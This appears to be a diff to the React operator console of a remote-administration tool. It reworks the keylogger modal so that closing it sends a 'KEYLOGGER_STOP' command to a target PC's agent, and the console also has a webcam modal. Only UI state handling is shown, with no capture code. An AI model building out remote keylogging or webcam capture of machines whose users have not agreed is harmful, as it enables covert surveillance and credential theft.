@@ -38,6 +38,7 @@ function App() {
   const [keyloggerRunning, setKeyloggerRunning] = useState(false);
   const [keyloggerContent, setKeyloggerContent] = useState('');
   const [keyloggerBusy, setKeyloggerBusy] = useState(false);
+  const [keyloggerLastLength, setKeyloggerLastLength] = useState(0);
   /** Khi true: không cập nhật lại nội dung từ poll (sau Clear view); Refresh dùng force để bỏ cờ và tải lại. */
   const [keyloggerViewCleared, setKeyloggerViewCleared] = useState(false);
   const [webcamOpen, setWebcamOpen] = useState(false);
@@ -552,21 +553,30 @@ function App() {
           <KeyloggerModal
               busy={keyloggerBusy}
               content={keyloggerContent}
-              onClear={() => {
+              onClose={async () => {
+                  if (selectedPc && keyloggerRunning) {
+                      try {
+                          await window.remoteApi.runCommand(selectedPc.id, 'KEYLOGGER_STOP');
+                      } catch {
+                          // ignore
+                      }
+                  }
+
+                  setKeyloggerRunning(false);
                   setKeyloggerContent('');
-                  setKeyloggerViewCleared(true);
-                  appendLog('Đã xóa nội dung hiển thị (log trên agent không đổi). Bấm Refresh để tải lại.');
+                  setKeyloggerLastLength(0);
+                  setKeyloggerOpen(false);
               }}
-              onClose={() => setKeyloggerOpen(false)}
-              onRefresh={() => void refreshKeyloggerLog({ force: true })}
+              onRefresh={() => {
+                  setKeyloggerContent('');
+                  setKeyloggerLastLength(0);
+              }}
               onStart={() => void handleStartKeylogger()}
-              onStop={() => void handleStopKeylogger()}
               open={keyloggerOpen}
               running={keyloggerRunning}
               targetLabel={
                   selectedPc ? `${selectedPc.name} (${selectedPc.host}:${selectedPc.port})` : 'No target'
               }
-              targetOs={selectedPc?.os ?? 'Windows'}
           />
 
           <WebcamModal
